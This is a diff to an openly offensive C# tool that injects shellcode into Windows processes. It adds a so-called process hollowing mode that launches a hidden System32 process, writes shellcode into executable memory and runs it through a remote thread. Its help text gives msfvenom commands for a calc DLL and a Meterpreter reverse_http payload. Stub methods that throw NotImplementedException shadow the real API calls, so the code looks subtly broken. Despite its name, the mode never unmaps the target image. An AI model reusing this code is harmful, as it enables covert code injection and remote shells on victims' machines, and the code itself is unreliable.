@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -36,6 +36,20 @@ namespace ProcessInjection
         [DllImport("kernel32", SetLastError = true)]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
         #endregion DLL Injection
+
+        #region Process Hollowing
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern uint SuspendThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        static extern int ResumeThread(IntPtr hThread);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+        #endregion Process Hollowing
 
         //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
         public enum ProcessAccessRights
@@ -79,6 +93,19 @@ namespace ProcessInjection
             PAGE_TARGETS_NO_UPDATE = 0x40000000,
         }
 
+        // https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
+        public enum MemOpenThreadAccess
+        {
+        
+        PROCESS_CREATE_THREAD = 0x0002,
+        PROCESS_QUERY_INFORMATION = 0x0400,
+        PROCESS_VM_OPERATION = 0x0008,
+        PROCESS_VM_WRITE = 0x0020,
+        PROCESS_VM_READ = 0x0010,
+        SUSPEND_RESUME = 0x0002,
+    }
+
+
         public static byte[] StringToByteArray(string hex)
         {
             return Enumerable.Range(0, hex.Length)
@@ -88,7 +115,7 @@ namespace ProcessInjection
         }
         public static byte[] convertfromc(string val)
         {
-            string rval = val.Replace("\"",string.Empty).Replace("\r\n", string.Empty).Replace("x", string.Empty);
+            string rval = val.Replace("\"", string.Empty).Replace("\r\n", string.Empty).Replace("x", string.Empty);
             string[] sval = rval.Split('\\');
 
             var fval = string.Empty;
@@ -138,6 +165,7 @@ namespace ProcessInjection
             }
         }
 
+
         public static void DLLInject(int pid, byte[] buf)
         {
             try
@@ -175,6 +203,79 @@ namespace ProcessInjection
             }
         }
 
+        // Process Hollowing function
+        public static void ProcHollowing(string proc, byte[] buf)
+        {
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.FileName = @"C:\Windows\System32\" + proc;
+                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                Process holproc = new Process();
+                holproc.StartInfo = startInfo;
+                holproc.Start();
+                Console.WriteLine($"[+] Process {proc} started in background.");
+
+                // https://stackoverflow.com/questions/71257/suspend-process-in-c-sharp
+                foreach (ProcessThread thread in holproc.Threads)
+                {
+                    IntPtr OpenProc;
+                    OpenProc = OpenThread((uint)MemOpenThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
+                    if (OpenProc == null)
+                    {
+                        break;
+                    }
+                    SuspendThread(OpenProc);
+                }
+                Console.WriteLine($"[+] Process {proc} has been Suspended.");
+                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)holproc.Id);
+                Console.WriteLine($"[+] Handle {procHandle} opened for the process {proc}.");
+                IntPtr spaceAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+                Console.WriteLine($"[+] Memory for injecting shellcode is allocated at 0x{spaceAddr}.");
+                uint lpNumberOfBytesWritten = 0;
+                WriteProcessMemory(procHandle, spaceAddr, buf, (uint)buf.Length, ref lpNumberOfBytesWritten);
+                Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
+                uint threadId = 0;
+                Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
+                IntPtr threatH = CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), ref threadId);
+                
+                foreach (ProcessThread thread in holproc.Threads)
+                {
+                    IntPtr OpenProc;
+                    OpenProc = OpenThread((uint)MemOpenThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
+                    if (OpenProc == null)
+                    {
+                        break;
+                    }
+                    ResumeThread(OpenProc);
+                }
+                Console.WriteLine($"[+] Process has been resumed.");
+                Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process {proc}.");
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
+                Console.WriteLine(ex.Message);
+            }
+        }
+        // End of Process Hollowing function
+
+        private static void WriteProcessMemory(IntPtr procHandle, IntPtr spaceAddr, byte[] buf, IntPtr intPtr, int v)
+        {
+            throw new NotImplementedException();
+        }
+
+        private static IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr zero, int length, uint mEM_COMMIT, uint pAGE_EXECUTE_READWRITE)
+        {
+            throw new NotImplementedException();
+        }
+
+        private static IntPtr OpenProcess(int v1, bool v2, int id)
+        {
+            throw new NotImplementedException();
+        }
+
         public static void logo()
         {
             Console.WriteLine();
@@ -199,8 +300,9 @@ namespace ProcessInjection
 [+] Currently the tool supports 2 process injection techniques.
     1) Vanila Process Injection
     2) DLL Injection
+    3) Process Hollowing
 
-[+] Vanila Process Injection
+[+] Vanila Process Injection and Process Hollowing
 [+] Currently the program accepts shellcode in 3 formats 
     1) base64
     2) hex
@@ -222,6 +324,11 @@ namespace ProcessInjection
 [+] Generating DLL and injecting it in the target process.
 [+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
 [+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2
+
+[+] Process Hollowing
+[+] Generating shellcode in c format and injecting it in the target process.
+[+] msfvenom -p windows/meterpreter/reverse_http LHOST=<local host> LPORT=<local port> -b ""\x00"" -f c 
+[+] ProcessInjection.exe /proc:notepad.exe /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3
 
 ";
             Console.WriteLine(help);
@@ -264,8 +371,36 @@ namespace ProcessInjection
                     Console.WriteLine("[+] Some arguments are missing. Please refer the help section for more details.");
                     help();
                 }
+                
+                // Process Hollowing Statement
+                else if (arguments.Count == 4 && arguments["/t"] == "3")
+                {
+                    string proc = (arguments["/proc"]);
+                    if (System.IO.File.Exists(arguments["/path"]))
+                    {
+                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                            byte[] buf = new byte[] { };
+                            if (arguments["/f"] == "c")
+                            {
+                                buf = convertfromc(shellcode);
+                            }
+                            else if (arguments["/f"] == "base64")
+                            {
+                            buf = Convert.FromBase64String(shellcode);
+                            }
+                            else if (arguments["/f"] == "hex")
+                            {
+                                buf = StringToByteArray(shellcode);
+                            }
+
+                            ProcHollowing(proc, buf);
+                    }
+                }
+                // End of Process Hollowing Statement
+
                 else if (arguments.Count >= 3)
                 {
+                    
                     int procid = Convert.ToInt32(arguments["/pid"]);
                     Process process = Process.GetProcessById(procid);
                     if (System.IO.File.Exists(arguments["/path"]))
@@ -295,10 +430,10 @@ namespace ProcessInjection
                             DLLInject(procid, buf);
                         }
                     }
-                    else
-                    {
-                        Console.WriteLine("[+] File doesn't exists. Please check the specified file path.");
-                    }
+                else
+                {
+                    Console.WriteLine("[+] File doesn't exists. Please check the specified file path.");
+                }
                 }
                 else
                 {
